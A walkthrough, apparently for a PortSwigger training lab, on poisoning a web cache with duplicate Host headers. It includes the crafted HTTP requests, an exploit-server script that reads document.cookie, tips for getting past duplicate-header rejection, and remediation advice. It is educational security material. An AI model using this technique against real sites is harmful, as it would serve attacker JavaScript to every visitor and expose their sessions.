# Lab: Web Cache Poisoning via Ambiguous Requests

**Category:** HTTP Host Header Attacks
**Difficulty:** Practitioner
**Lab link:** [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

## Overview

The application reflects the `Host` header value in a `<script src="//HOST/resources/js/tracking.js">` tag. The cache keys on the **first** `Host` header, but the app uses the **second** `Host` header to build the script URL. By sending two `Host` headers, the poisoned response (with the exploit server in the script src) is cached under the legitimate cache key — serving malicious JS to all visitors.

## Key Concepts

- **Ambiguous request:** Two `Host` headers create a discrepancy — the app and cache parse them differently.
- **Cache keys on first Host:** The cache stores the response under the legitimate lab host.
- **App uses second Host:** The script src URL is built from the second (attacker-controlled) Host.
- **Full browser headers required:** A minimal request with two Host headers gets a 400 error. The duplicate Host headers are only accepted when sent with a full set of browser headers (User-Agent, Accept, Sec-Fetch-*, Referer, etc.).

## Exploit Flow

```
GET / HTTP/1.1
Host: <lab>.web-security-academy.net          ← cache keys on this
Host: exploit-server.exploit-server.net       ← app builds script src from this
...full browser headers...
```

Response cached as:
```html
<script src="//exploit-server.exploit-server.net/resources/js/tracking.js">
```

## Solution

### Step 1 — Identify the reflection

Send a normal `GET /` and observe the script tag:
```html
<script type="text/javascript" src="//<lab-host>/resources/js/tracking.js">
```
The host in this URL is controllable via a second `Host` header.

### Step 2 — Verify duplicate Host headers work

Confirm that adding a second `Host` header with full browser headers returns 200 (not 400). A minimal request with just two Host headers gets rejected.

### Step 3 — Set up exploit server

Create `/resources/js/tracking.js` on the exploit server:
```javascript
alert(document.cookie)
```
Content-Type: `application/javascript`

### Step 4 — Poison the cache

Send the following request repeatedly until `X-Cache: hit`:
```http
GET / HTTP/1.1
Host: <lab>.web-security-academy.net
Host: exploit-server.exploit-server.net
Cookie: session=<session>; _lab=<lab-cookie>
User-Agent: Mozilla/5.0 ...
Accept: text/html,...
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Referer: https://exploit-server.exploit-server.net/
Connection: keep-alive
```

### Step 5 — Victim visits → XSS fires → lab solved

The cached response serves the exploit server's JS to all visitors. The simulated victim triggers the alert.

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `400 Duplicate header names are not allowed` | Minimal request — only the Host headers sent | Add full browser headers (User-Agent, Accept, Sec-Fetch-*, Referer) |
| X-Forwarded-Host not reflected | Lab uses Host header, not X-Forwarded-Host | Use duplicate Host headers instead |
| Script src still shows lab host | X-Forwarded-Host typo or wrong approach | Copy exploit server URL exactly from the lab page |

## Remediation

- Reject or normalise requests with duplicate `Host` headers at the proxy layer.
- Do not use the `Host` header to construct URLs — use a configured absolute base URL.
- Include all headers that influence response content in the cache key.

## Key Takeaways

- "Ambiguous request" = app and cache disagree on which Host header is authoritative.
- Full browser headers are sometimes required to bypass duplicate header rejection.
- Always check the `Cache-Control: max-age` — with 30s TTL, you need to repoise quickly after expiry.
